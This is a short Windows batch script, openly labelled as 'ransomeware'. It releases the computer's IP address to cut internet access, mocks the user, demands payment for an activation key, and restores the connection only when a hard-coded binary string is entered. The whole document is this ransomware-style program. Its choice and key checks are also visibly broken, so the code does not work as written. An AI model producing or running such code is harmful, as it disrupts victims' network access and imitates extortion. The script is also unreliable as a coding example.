@echo off
cls
echo %TIME%
echo  %DATE%
color a
set error=Enter A valid Option
ipconfig/release
echo "Ouch you won't access internet again,sorry"
echo "Y:Yes"
echo "N:No"
choice /c AB /m "Would you like to Access your internet connection back?Y/N"
if choice =="Y" (goto :ransomeware) else(echo  %error%)
if choice =="N" (echo Get another system 😠😠
exit) else(echo %error%)
:ransomeware
cls
echo.
echo Pay us if you really want to access internet🤠🤠 and get the activation key
echo.
set /p key=Private Key:
if %key%=="0101010001100101011100100110110101110101011110000100100001100001011000110110101101111010" (goto :congrats) else(echo "Invalid private Key!!..Enter a valid activation key" goto :ransomeware)
:congrats
cls
echo.
ipconfig/renew
echo "Congratulations, you have now access internet..Sorry for the stress
exit /b 0
